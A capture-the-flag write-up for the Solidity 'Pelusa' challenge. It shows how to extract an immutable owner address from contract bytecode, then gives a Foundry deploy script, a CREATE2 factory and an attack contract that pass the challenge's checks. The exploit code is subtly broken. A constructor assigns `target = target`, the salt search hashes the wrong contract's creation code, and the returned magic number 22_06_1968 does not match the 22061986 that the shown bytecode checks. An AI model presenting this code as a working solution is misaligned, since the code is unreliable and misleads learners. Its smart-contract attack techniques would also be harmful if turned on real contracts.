### Pelusa

Solution by 2pats.eth

### Exploit Overview

### Reading Immutable Value

the "immutable" keyword of solidity does not use typical storage, instead it stores that value as a bytes32 in the runtime code of the contract. We can parse it manually:

Here is a possible example of Pelusa.sol in bytecode:

```
0x608060405234801561001057600080fd5b506004361061004c5760003560e01c8063478a4be514610051578063a50883391461006d578063a7a7e4e814610077578063d95f98ce1461008f575b600080fd5b61005a60015481565b6040519081526020015b60405180910390f35b610075610097565b005b61007f6100f2565b6040519015158152602001610064565b610075610191565b333b156100de5760405162461bcd60e51b815260206004820152601060248201526f4f6e6c7920454f4120706c617965727360801b60448201526064015b60405180910390fd5b600080546001600160a01b03191633179055565b600080546040805163e09235ad60e01b815290516001600160a01b037f0000000000000000000000007eeefe54f86ce065a68c3b0f6c4b3d9bfb491ad6811693169163e09235ad9160048083019260209291908290030181865afa15801561015e573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018291906102dc565b6001600160a01b031614905090565b6101996100f2565b6101ce5760405162461bcd60e51b81526020600482015260066024820152651b5a5cdcd95960d21b60448201526064016100d5565b6000805460408051600481526024810182526020810180516001600160e01b03166306c0197f60e11b179052905183926001600160a01b0316916102119161030c565b600060405180830381855af49150503d806000811461024c576040519150601f19603f3d011682016040523d82523d6000602084013e610251565b606091505b50915091508161028c5760405162461bcd60e51b81526020600482015260066024820152651b5a5cdcd95960d21b60448201526064016100d5565b61029581610347565b630150a3a2146102d85760405162461bcd60e51b815260206004820152600e60248201526d19185d18481a5b98dbdc9c9958dd60921b60448201526064016100d5565b5050565b6000602082840312156102ee57600080fd5b81516001600160a01b038116811461030557600080fd5b9392505050565b6000825160005b8181101561032d5760208186018101518583015201610313565b8181111561033c576000828501525b509190910192915050565b80516020808301519190811015610368576000198160200360031b1b821691505b5091905056fea2646970667358221220ce3e5a79b88b308b185babdf05ccc5a119bbeb3ff14ec5259b53f45e6c867ea564736f6c634300080a0033
```

in order to find our owner address, look for 12 bytes of zeros and the next 20bytes is the contract addresse, the example above would be `0000000000000000000000007eeefe54f86ce065a68c3b0f6c4b3d9bfb491ad6`

and when we just take the last 20 bytes and make it a checksum address, the resulting address is `0x7eEEfE54f86Ce065a68C3B0f6c4B3d9bfB491Ad6`

### POC Contracts

This solution uses 2 different contracts, a factory contract and the solution contract: `PelusaSolutionFactory.sol` and `PelusaSolution.sol` respectively

we need a factory because the CTF requires msg.sender to have an address that must leave a remainder of 10 when modulo divided by 100

we can use create2 opcode of EIP-1014 to produce a contract with an address that meets that requirement

I did this work off-chain inside the following foundry script:

```
//Deploy.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "../lib/forge-std/src/Script.sol";
import "../src/PelusaSolution.sol";
import "../src/PelusaSolutionFactory.sol";
import "../instances/Pelusa.sol";
import {Create2} from "../lib/openzeppelin-contracts/contracts/utils/Create2.sol";


contract Deploy is Script {
    function run() public {
        //load PK from .env
        vm.startBroadcast(vm.envUint("HH1PK"));

        //while loop to find a suitable salt that will produce an address we need for the modulo division constraint
        uint32 i;
        while (i < 500) {
            bytes32 salt = bytes32(uint256(i));
            address expectedAddress = computeSolutionAddress(salt);
            // in the case of good address, deploy factory resulting in that address
            if (uint256(uint160(expectedAddress)) % 100 == 10) {
               //we assume that Pelusa.sol is already deployed and we know its address
                new PelusaSolutionFactory{salt: salt}(vm.envAddress("PELUSA_ADDRESS"));
                break;
            }
            i++;
        }

        vm.stopBroadcast();
    }

    function computeSolutionAddress(bytes32 _salt) public view returns (address) {
        bytes memory _bytecodeHash = type(Pelusa).creationCode;
        return Create2.computeAddress(_salt, keccak256(_bytecodeHash));
    }
}

```

\*\* note I used Openzeppelin's Create2 implementation as a helper to compute the addresses

now that we have an address we need, let's take a look at the factory contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./PelusaSolution.sol";

contract PelusaSolutionFactory {
    address public solutionAddress;

    //deploy in the constructor to by pass the CTF 0 code size constraint
   //I am passing in the address of the CTF contract Pelusa.sol, so our solution contract can reference its methods
    constructor(address _target) {
        solutionAddress = address(new PelusaSolution(_target));
    }
}

```

Finally let's take a look at the solution contract that our factory deploys

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../instances/Pelusa.sol";

contract PelusaSolution is IGame {
    Pelusa target;

    constructor(address _target) {
        //save the CTF contract address in storage
        target = target;

        //passTheBall must be called in the constructor here because msg.sender has to be our factory contract, in order to pass this function's checks
        target.passTheBall();
    }

   //we call this function after the deployment to initiate the rest of the hack
    function attack() external {
        target.shoot();
    }

    //this function complies with the checks of the shoot() function of the CTF contract, just return the necessary tuple
    function handOfGod() external returns (bool success, bytes memory data)  {
        bytes memory data = abi.encodePacked(uint256(22_06_1968));
        return (true,  data);
    }

   //this function returns the value of the immutable owner of the CTF contract. We determined this address earlier by examining the CTF runtime bytecode
    function getBallPossesion() external view returns (address) {
        return 0x7eEEfE54f86Ce065a68C3B0f6c4B3d9bfB491Ad6;
    }
}

```
